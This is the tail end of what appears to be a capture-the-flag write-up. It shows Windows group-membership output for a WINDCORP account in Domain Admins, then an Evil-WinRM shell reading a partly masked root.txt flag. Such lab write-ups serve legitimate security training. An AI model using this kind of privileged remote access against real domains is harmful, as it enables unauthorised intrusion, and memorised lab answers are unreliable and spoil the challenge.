WINDCORP\Protected Users                        Group            S-1-5-21-1844305427-4058123335-2739572863-525 Mandatory group, Enabled by default, Enabled group
WINDCORP\Domain Admins                          Group            S-1-5-21-1844305427-4058123335-2739572863-512 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity      Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
WINDCORP\Denied RODC Password Replication Group Alias            S-1-5-21-1844305427-4058123335-2739572863-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level            Label            S-1-16-12288

```

And can read `root.txt`:

```
*Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
b5fd7823************************

```